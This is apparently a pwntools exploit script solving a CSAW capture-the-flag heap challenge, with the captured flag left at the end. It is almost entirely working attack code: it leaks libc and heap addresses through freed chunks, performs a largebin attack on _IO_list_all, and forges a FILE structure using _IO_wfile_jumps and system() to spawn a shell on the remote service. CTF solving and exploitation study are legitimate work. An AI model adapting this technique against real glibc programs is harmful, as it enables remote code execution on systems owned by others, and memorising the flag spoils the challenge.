#!/usr/bin/env python3

from pwn import *

exe = ELF('./chal_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def build(idx, size):
	sa(b">> ", b"1")
	sa(b"position: ", f"{idx}".encode() + b"\x00")
	sa(b"capacity of: ", f"{size}".encode() + b"\x00")

def launch(idx):
	sa(b">> ", b"2")
	sa(b"position: ", f"{idx}".encode() + b"\x00")

def load(idx, data):
	sa(b">> ", b"3")
	sa(b"position: ", f"{idx}".encode() + b"\x00")
	sa(b"ammo of: ", data)

def check(idx):
	sa(b">> ", b"4")
	sa(b"position: ", f"{idx}".encode() + b"\x00")	

script = '''
'''

p = remote("chals.ctf.csaw.io", 21001)
#p = process('./chal_patched')
#p = gdb.debug('./chal_patched', gdbscript = script)

# leak libc, heap
build(0, 0x428)
build(1, 0x18)
launch(0)
launch(1)
check(0)
libc_base = u64(p.recv(8)) - 0x203b20
lleak("libc_base", libc_base)
check(1)
heap_base = (u64(p.recv(8))) << 12
lleak("heap_base", heap_base)

# largebin attack _IO_list_all
build(0, 0x428)
build(1, 0x18)
build(2, 0x418)
build(3, 0x18)
launch(0)
build(4, 0x438)
launch(2)
_IO_list_all = libc_base + libc.symbols['_IO_list_all']
payload = p64(libc_base + 0x203f10) * 2 + p64(heap_base + 0x290) + p64(_IO_list_all - 0x20)
load(0, payload)
build(5, 0x438)

# prepare fake file struct
fileptr = heap_base + 0x6e0
system = libc_base + libc.symbols['system']
load(1, b"A" * 0x10 + p64(0xfbad2484 + (u32(b";sh;") << 32))) # flag
fp = FileStructure()
fp._IO_read_end = system
fp._IO_write_base = 0
fp._IO_write_ptr = 1
fp._lock = fileptr + 0x1000
fp._wide_data = fileptr
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps']
payload = bytes(fp) + p64(fileptr + 0x10 - 0x68)
load(2, payload[0x10::])

sa(b">> ", b"6")

#debug()
#
p.interactive()
#csawctf{mafmub_hum4n_c4n_1053_gugCi0_bu7_4l13n5_c4n_n3v3r_w1n_dikjop}
